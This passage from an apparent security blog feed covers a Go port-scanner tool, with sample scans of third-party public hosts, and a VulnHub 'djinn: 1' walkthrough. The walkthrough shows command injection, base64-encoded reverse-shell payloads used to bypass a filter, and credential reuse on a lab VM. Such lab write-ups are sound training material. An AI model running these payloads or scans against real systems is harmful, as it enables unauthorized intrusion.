<li>PBKDF2 encryption (set &lt;passwdrd, salt, iter, keylen, hash&gt; to strong encrypt data)</li>
</ol>
</li>
<li><ol start="999">
<li>[–Generate Rsa Public and Private Key :)–]</li>
</ol>
</li>
<li><ol start="35">
<li>RSA hex formate encryption</li>
</ol>
</li>
<li><ol start="36">
<li>RSA hex formate decryption</li>
</ol>
</li>
<li><ol start="37">
<li>RSA sign confirm</li>
</ol>
</li>
<li><ol start="9999">
<li>[ECC Key generate] –(bitcoin and ID card … used)–[elliptic.P256() used]</li>
</ol>
</li>
<li><ol start="38">
<li>ECC Encryption –(bitcoin and ID card … used)–[elliptic.P256() used]</li>
</ol>
</li>
<li><ol start="39">
<li>ECC Decryption –(bitcoin and ID card … used)–[elliptic.P256() used]</li>
</ol>
</li>
<li><ol start="40">
<li>ECC sign confirm –(bitcoin and ID card … used)–[elliptic.P256() used]</li>
</ol>
</li>
<li><ol start="41">
<li>Blowfish Ecb Encryption</li>
</ol>
</li>
<li><ol start="42">
<li>Blowfish Ecb Decryption</li>
</ol>
</li>
<li><ol start="43">
<li>Md4 encryption</li>
</ol>
</li>
<li><ol start="44">
<li>Aes Gcm Encryption [Ethereum Whisper protocol used]</li>
</ol>
</li>
<li><ol start="45">
<li>Aes Gcm Decryption [Ethereum Whisper protocol used]</li>
</ol>
</li>
<li><ol start="46">
<li>des Cfb encryption</li>
</ol>
</li>
<li><ol start="47">
<li>des Cfb decryption</li>
</ol>
</li>
<li><ol start="48">
<li>AES OFB Encryption</li>
</ol>
</li>
<li><ol start="49">
<li>AES OFB Decryption</li>
</ol>
</li>
<li><ol start="50">
<li>des Ctr encryption</li>
</ol>
</li>
<li><ol start="51">
<li>des Ctr decryption</li>
</ol>
</li>
<li><ol start="52">
<li>des Ofb encryption</li>
</ol>
</li>
<li><ol start="53">
<li>des Ofb decryption</li>
</ol>
</li>
<li><ol start="54">
<li>Elliptic Curve Digital Signature Verified</li>
</ol>
</li>
<li><ol start="55">
<li>Vertfied pub key types</li>
</ol>
</li>
<li><ol start="56">
<li>HKDF encryption</li>
</ol>
</li>
<li><ol start="57">
<li>base32 encryption</li>
</ol>
</li>
<li><ol start="58">
<li>base32 decryption</li>
</ol>
</li>
<li><ol start="59">
<li>nacl box encryption and decryption</li>
</ol>
</li>
<li><ol start="60">
<li>nacl secretbox encryption and decryption</li>
</ol>
</li>
<li><ol start="61">
<li>scrypt encryption [Bitcoin used strong encryption]</li>
</ol>
</li>
<li><ol start="62">
<li>Shake256 encryption</li>
</ol>
</li>
<li><ol start="63">
<li>Caesar encryption</li>
</ol>
</li>
<li><ol start="64">
<li>Caesar decryption</li>
</ol>
</li>
<li><ol start="65">
<li>hex dump</li>
</ol>
</li>
</ul>
<h3 id="优点特色"><a href="#优点特色" class="headerlink" title="优点特色"></a>优点特色</h3><ul>
<li>支持多达65种加解密算法</li>
<li>彩色输出美化</li>
<li>持续添加更多算法支持</li>
</ul>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul>
<li>如果工具打开报错请把flag.txt和go build生成的goendecoder.exe放在同一目录下即可</li>
<li>有任何问题请联系qq:1185151867 :)</li>
</ul>
<p><font color="yellow">:) enjoy it ! :)</font></p>
]]></content>
      <categories>
        <category>golang</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>ctf tools</tag>
      </tags>
  </entry>
  <entry>
    <title>goportscan-go调用最大cpu内核数实现批量ip列表tcp端口快速扫描</title>
    <url>/2020/03/25/goportscan/</url>
    <content><![CDATA[<p><font color="green">支持ip列表快速批量tcp65535全端口扫描，并将结果写入txt文件，由本菜独立开发。。。</font></p>
<h4 id="Tcp-Fast-Port-Scanner"><a href="#Tcp-Fast-Port-Scanner" class="headerlink" title="Tcp Fast Port Scanner"></a>Tcp Fast Port Scanner</h4><hr>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> ____          _               _  __           _ _</span><br><span class="line">| __ ) _   _  | |   _   _  ___(_)/ _| ___ _ __/ / |</span><br><span class="line">|  _ \| | | | | |  | | | |/ __| | |_ / _ \ <span class="string">&#x27;__| | |</span></span><br><span class="line"><span class="string">| |_) | |_| | | |__| |_| | (__| |  _|  __/ |  | | |</span></span><br><span class="line"><span class="string">|____/ \__, | |_____\__,_|\___|_|_|  \___|_|  |_|_|</span></span><br><span class="line"><span class="string">       |___/</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<hr>
<ul>
<li>By Lucifer11</li>
<li>My QQ:1185151867</li>
<li><a href="https://fdlucifer.github.io/">My Blog</a></li>
</ul>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9nb3BvcnRzY2Fu">download goportscan<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h2 id="help"><a href="#help" class="headerlink" title="help"></a>help</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\Go\testgofiles\oldboygo\day12\goportscan&gt;goportscan.exe -h</span><br><span class="line">Usage of goportscan.exe:</span><br><span class="line">  -allports string</span><br><span class="line">        select this option to scan all open ports <span class="keyword">in</span> 65535 ports (default <span class="string">&quot;n&quot;</span>)</span><br><span class="line">  -end-port int</span><br><span class="line">        the port from whitch the scanning ends (default 10000)</span><br><span class="line">  -ipfile string</span><br><span class="line">        the file stored ip list (default <span class="string">&quot;iplist.txt&quot;</span>)</span><br><span class="line">  -start-port int</span><br><span class="line">        the port on whitch the scanning starts (default 1)</span><br><span class="line">  -timeout duration</span><br><span class="line">        timeout (default 500ms)</span><br></pre></td></tr></table></figure>

<h2 id="批量扫ip65535全端口"><a href="#批量扫ip65535全端口" class="headerlink" title="批量扫ip65535全端口"></a>批量扫ip65535全端口</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\Go\testgofiles\oldboygo\day12\goportscan&gt;goportscan.exe -allports y</span><br><span class="line">...</span><br><span class="line">[+] scanning host: [163.com], port: [64660]</span><br><span class="line">[+] scanning host: [163.com], port: [64642]</span><br><span class="line">[+] scanning host: [163.com], port: [65094]</span><br><span class="line">[+] scanning host: [163.com], port: [64655]</span><br><span class="line">[+] scanning host: [163.com], port: [65173]</span><br><span class="line">[+] scanning host: [163.com], port: [65311]</span><br><span class="line">[+] scanning host: [163.com], port: [64934]</span><br><span class="line">[+] scanning host: [163.com], port: [60555]</span><br><span class="line">[+] scanning host: [163.com], port: [60259]</span><br><span class="line">[+] scanning host: [163.com], port: [64640]</span><br><span class="line">[+] host [163.com] opening ports: [443 80]</span><br><span class="line">------------------------------------------------</span><br><span class="line">[+] [4399.com] Resolved address is [118.184.184.70]</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/FDlucifer/goportscan/master/pics/allports.jpg"></li>
</ul>
<h2 id="批量扫ip3389端口"><a href="#批量扫ip3389端口" class="headerlink" title="批量扫ip3389端口"></a>批量扫ip3389端口</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\Go\testgofiles\oldboygo\day12\goportscan&gt;goportscan.exe -start-port 3389 -end-port 3389</span><br><span class="line">......</span><br><span class="line">[+] [60.31.205.76] Resolved address is [60.31.205.76]</span><br><span class="line">[+] scanning host: [60.31.205.76], port: [3389]</span><br><span class="line">[+] host [60.31.205.76] opening ports: []</span><br><span class="line">------------------------------------------------</span><br><span class="line">[+] [119.23.85.137] Resolved address is [119.23.85.137]</span><br><span class="line">[+] scanning host: [119.23.85.137], port: [3389]</span><br><span class="line">[+] host [119.23.85.137] opening ports: []</span><br><span class="line">------------------------------------------------</span><br><span class="line">[+] [39.104.21.7] Resolved address is [39.104.21.7]</span><br><span class="line">[+] scanning host: [39.104.21.7], port: [3389]</span><br><span class="line">[+] host [39.104.21.7] opening ports: [3389]</span><br><span class="line">------------------------------------------------</span><br><span class="line">[+] [106.12.118.25] Resolved address is [106.12.118.25]</span><br><span class="line">[+] scanning host: [106.12.118.25], port: [3389]</span><br><span class="line">[+] host [106.12.118.25] opening ports: []</span><br><span class="line">------------------------------------------------</span><br><span class="line">[+] iplist scan finished!</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/FDlucifer/goportscan/master/pics/singleport.jpg"></li>
</ul>
<h3 id="优点特色"><a href="#优点特色" class="headerlink" title="优点特色"></a>优点特色</h3><ul>
<li>批量快速快速扫描ip文件列表，并遍历65535全端口</li>
<li>ip和域名都能扫</li>
<li>扫描结果以ip:[port]形式放入resultip.txt文件中</li>
<li>支持批量ip单端口扫描</li>
<li>持续添加新功能</li>
</ul>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul>
<li>如果工具打开报错请把flag.txt和go build生成的goportscan.exe放在同一目录下即可</li>
</ul>
<h3 id="QQ-or-微信"><a href="#QQ-or-微信" class="headerlink" title="QQ or 微信"></a>QQ or 微信</h3><ul>
<li>1185151867</li>
</ul>
]]></content>
      <categories>
        <category>golang</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>penetration tools</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub-walkthrough[djinn-1]</title>
    <url>/2020/05/21/djinn-1/</url>
    <content><![CDATA[<h3 id="name"><a href="#name" class="headerlink" title="name"></a>name</h3><p>Name: djinn: 1<br>Date release: 18 Nov 2019</p>
<h3 id="download"><a href="#download" class="headerlink" title="download"></a>download</h3><p>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xTGxUNUpjZGx5RFVjdmtuMTJ0OW9JSUZvMFg5R3Q1M0Ivdmlldz91c3A9c2hhcmluZw==">https://drive.google.com/file/d/1LlT5JcdlyDUcvkn12t9oIIFo0X9Gt53B/view?usp=sharing<i class="fa fa-external-link-alt"></i></span><br>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9kamlubi9kamlubi5vdmE=">https://download.vulnhub.com/djinn/djinn.ova<i class="fa fa-external-link-alt"></i></span><br>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9kamlubi9kamlubi5vdmEudG9ycmVudA==">https://download.vulnhub.com/djinn/djinn.ova.torrent<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><ul>
<li>Level: Beginner-Intermediate</li>
<li>flags: user.txt and root.txt</li>
<li>Description: The machine is VirtualBox as well as VMWare compatible. The DHCP will assign an IP automatically. You’ll see the IP right on the login screen. You have to find and read two flags (user and root) which is present in user.txt and root.txt respectively.</li>
<li>Format: Virtual Machine (Virtualbox - OVA)</li>
<li>Operating System: Linux</li>
</ul>
<a id="more"></a>

<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap as usual</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.*</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.127</span><br><span class="line">Host is up (0.00013s latency).</span><br><span class="line">MAC Address: 08:00:27:03:DB:2D (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -sC -v -p- -T4 192.168.56.127</span></span><br><span class="line">PORT     STATE    SERVICE VERSION</span><br><span class="line">21/tcp   open     ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| -rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt</span><br><span class="line">| -rw-r--r--    1 0        0             128 Oct 21  2019 game.txt</span><br><span class="line">|_-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.56.126</span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth <span class="built_in">limit</span></span><br><span class="line">|      Session timeout <span class="keyword">in</span> seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 3</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp   filtered ssh</span><br><span class="line">1337/tcp open     waste?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   NULL: </span><br><span class="line">|     ____ _____ _ </span><br><span class="line">|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ </span><br><span class="line">|     \x20/ _ \x20 | | | | <span class="string">&#x27;_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/</span></span><br><span class="line"><span class="string">|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|</span></span><br><span class="line"><span class="string">|     Let&#x27;</span>s see how good you are with simple maths</span><br><span class="line">|     Answer my questions 1000 <span class="built_in">times</span> and I<span class="string">&#x27;ll give you your gift.</span></span><br><span class="line"><span class="string">|     &#x27;</span>*<span class="string">&#x27;, 9)</span></span><br><span class="line"><span class="string">|   RPCCheck: </span></span><br><span class="line"><span class="string">|     ____ _____ _ </span></span><br><span class="line"><span class="string">|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ </span></span><br><span class="line"><span class="string">|     \x20/ _ \x20 | | | | &#x27;</span>_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/</span><br><span class="line">|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|</span><br><span class="line">|     Let<span class="string">&#x27;s see how good you are with simple maths</span></span><br><span class="line"><span class="string">|     Answer my questions 1000 times and I&#x27;</span>ll give you your gift.</span><br><span class="line">|_    <span class="string">&#x27;+&#x27;</span>, 5)</span><br><span class="line">7331/tcp open     http    Werkzeug httpd 0.16.0 (Python 2.7.15+)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: HEAD OPTIONS GET</span><br><span class="line">|_http-server-header: Werkzeug/0.16.0 Python/2.7.15+</span><br><span class="line">|_http-title: Lost <span class="keyword">in</span> space</span><br></pre></td></tr></table></figure>

<ul>
<li>Enumeration</li>
</ul>
<p>ftp anonymous login, then get three files</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/djinn-1<span class="comment"># ftp 192.168.56.127</span></span><br><span class="line">Connected to 192.168.56.127.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (192.168.56.127:root): anonymous </span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt</span><br><span class="line">-rw-r--r--    1 0        0             128 Oct 21  2019 game.txt</span><br><span class="line">-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; get creds.txt</span><br><span class="line"><span class="built_in">local</span>: creds.txt remote: creds.txt</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> creds.txt (11 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">11 bytes received <span class="keyword">in</span> 0.00 secs (109.6142 kB/s)</span><br><span class="line">ftp&gt; get game.txt</span><br><span class="line"><span class="built_in">local</span>: game.txt remote: game.txt</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> game.txt (128 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">128 bytes received <span class="keyword">in</span> 0.02 secs (7.0244 kB/s)</span><br><span class="line">ftp&gt; get message.txt</span><br><span class="line"><span class="built_in">local</span>: message.txt remote: message.txt</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> message.txt (113 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">113 bytes received <span class="keyword">in</span> 0.05 secs (2.4331 kB/s)</span><br></pre></td></tr></table></figure>

<p>use cat command to check the content</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/djinn-1<span class="comment"># cat creds.txt </span></span><br><span class="line">nitu:81299</span><br><span class="line">root@kali:~/vulnhub/djinn-1<span class="comment"># cat game.txt </span></span><br><span class="line">oh and I forgot to tell you I<span class="string">&#x27;ve setup a game for you on port 1337. See if you can reach to the </span></span><br><span class="line"><span class="string">final level and get the prize.</span></span><br><span class="line"><span class="string">root@kali:~/vulnhub/djinn-1# cat message.txt </span></span><br><span class="line"><span class="string">@nitish81299 I am going on holidays for few days, please take care of all the work. </span></span><br><span class="line"><span class="string">And don&#x27;</span>t mess up anything.</span><br></pre></td></tr></table></figure>

<p>use Netcat to make a connection so that we can play the game</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.56.127 1337</span></span><br><span class="line">  ____                        _____ _                </span><br><span class="line"> / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ </span><br><span class="line">| |  _ / _` | <span class="string">&#x27;_ ` _ \ / _ \   | | | | &#x27;</span>_ ` _ \ / _ \</span><br><span class="line">| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/</span><br><span class="line"> \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|</span><br><span class="line">                                                     </span><br><span class="line"></span><br><span class="line">Let<span class="string">&#x27;s see how good you are with simple maths</span></span><br><span class="line"><span class="string">Answer my questions 1000 times and I&#x27;</span>ll give you your gift.</span><br><span class="line">(9, <span class="string">&#x27;+&#x27;</span>, 9)</span><br><span class="line">&gt; 18</span><br><span class="line">(3, <span class="string">&#x27;-&#x27;</span>, 1)</span><br><span class="line">&gt; 2</span><br><span class="line">(2, <span class="string">&#x27;/&#x27;</span>, 3)</span><br><span class="line">&gt; 2</span><br><span class="line">Wrong answer</span><br></pre></td></tr></table></figure>

<p>it’s just a  waste time game, go for next step</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.127:7331/</span><br></pre></td></tr></table></figure>

<p>use gobuster for dir</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.127:7331/ -w /usr/share/wordlists/dirb/big.txt -t 500</span><br><span class="line">/genie (Status: 200)</span><br><span class="line">/wish (Status: 200)</span><br></pre></td></tr></table></figure>

<p>genie page is an error 403,perhaps it’s no use<br>the following page is a little interesting</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.127:7331/wish</span><br></pre></td></tr></table></figure>

<p>this page can excecute commands</p>
<p>request:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /wish HTTP/1.1</span><br><span class="line">Host: 192.168.56.127:7331</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">Origin: http://192.168.56.127:7331</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.56.127:7331/wish</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">cmd=id</span><br></pre></td></tr></table></figure>

<p>response:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HTTP/1.0 302 FOUND</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 379</span><br><span class="line">Location: http://192.168.56.127:7331/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A</span><br><span class="line">Server: Werkzeug/0.16.0 Python/2.7.15+</span><br><span class="line">Date: Sat, 23 May 2020 05:03:45 GMT</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Redirecting...&lt;/title&gt;</span><br><span class="line">&lt;h1&gt;Redirecting...&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;You should be redirected automatically to target URL: &lt;a href=<span class="string">&quot;/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A&quot;</span>&gt;/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A&lt;/a&gt;.  If not click the link.</span><br></pre></td></tr></table></figure>

<ul>
<li>Exploitation</li>
</ul>
<p>get a shell by using nc</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.56.126 1155</span><br></pre></td></tr></table></figure>

<p>excecute the payload, we got the following error</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.127:7331/genie?name=Wrong+choice+of+words</span><br></pre></td></tr></table></figure>

<p>some of the symbols are characters are restricted</p>
<p>we can use other payload, encrypt the whole command in base64 format </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.56.126/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEyNi84MDgwIDA+JjE= | base64 -d | bash</span><br></pre></td></tr></table></figure>

<p>then we get a shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 8080</span></span><br><span class="line">listening on [any] 8080 ...</span><br><span class="line">192.168.56.127: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.126] from (UNKNOWN) [192.168.56.127] 47358</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (758): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">www-data@djinn:/opt/80$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@djinn:/opt/80$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>

<p>let’s take a look around</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@djinn:/opt/80$ cat app.py</span><br><span class="line">cat app.py</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">from flask import Flask, redirect, render_template, request, url_for</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&quot;key&quot;</span></span><br><span class="line"></span><br><span class="line">CREDS = <span class="string">&quot;/home/nitish/.dev/creds.txt&quot;</span></span><br><span class="line"></span><br><span class="line">RCE = [<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;;&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def validate(cmd):</span><br><span class="line">    <span class="keyword">if</span> CREDS <span class="keyword">in</span> cmd and <span class="string">&quot;cat&quot;</span> not <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="built_in">return</span> True</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> RCE:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> cmd:</span><br><span class="line">                <span class="keyword">if</span> i == j:</span><br><span class="line">                    <span class="built_in">return</span> False</span><br><span class="line">        <span class="built_in">return</span> True</span><br><span class="line">    except Exception:</span><br><span class="line">        <span class="built_in">return</span> False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>])</span><br><span class="line">def index():</span><br><span class="line">    <span class="built_in">return</span> render_template(<span class="string">&quot;main.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&quot;/wish&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&quot;GET&quot;</span>])</span><br><span class="line">def wish():</span><br><span class="line">    execute = request.form.get(<span class="string">&quot;cmd&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> execute:</span><br><span class="line">        <span class="keyword">if</span> validate(execute):</span><br><span class="line">            output = subprocess.Popen(execute, shell=True,</span><br><span class="line">                                      stdout=subprocess.PIPE).stdout.read()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output = <span class="string">&quot;Wrong choice of words&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> redirect(url_for(<span class="string">&quot;genie&quot;</span>, name=output))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span> render_template(<span class="string">&#x27;wish.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&#x27;/genie&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def genie():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        page = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = <span class="string">&quot;It&#x27;s not that hard&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> render_template(<span class="string">&#x27;genie.html&#x27;</span>, file=page)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=True)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /home/nitish/.dev/creds.txt</span><br><span class="line">nitish:p4ssw0rdStr3r0n9</span><br></pre></td></tr></table></figure>

<p>change our shell to a tty shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@djinn:/opt/80$ python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line">$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">$ su nitish</span><br><span class="line">su nitish</span><br><span class="line">Password: p4ssw0rdStr3r0n9</span><br><span class="line"></span><br><span class="line">nitish@djinn:/opt/80$ id</span><br><span class="line">id</span><br><span class="line">uid=1001(nitish) gid=1001(nitish) groups=1001(nitish)</span><br><span class="line">nitish@djinn:/opt/80$ whoami</span><br><span class="line">whoami</span><br><span class="line">nitish</span><br></pre></td></tr></table></figure>

<p>finally, we get user.txt…</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nitish@djinn:/opt/80$ <span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">nitish@djinn:~$ ls</span><br><span class="line">ls</span><br><span class="line">user.txt</span><br><span class="line">nitish@djinn:~$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">10aay8289ptgguy1pvfa73alzusyyx3c</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub276.jpg"></li>
</ul>
<h3 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post Exploitation"></a>Post Exploitation</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nitish@djinn:~$ sudo -l                                                                              </span><br><span class="line">sudo -l                                                                                              </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> nitish on djinn:                                                       </span><br><span class="line">    env_reset, mail_badpass,                                                                         </span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin         </span><br><span class="line"></span><br><span class="line">User nitish may run the following commands on djinn:</span><br><span class="line">    (sam) NOPASSWD: /usr/bin/genie</span><br></pre></td></tr></table></figure>

<p>understand how it works</p>
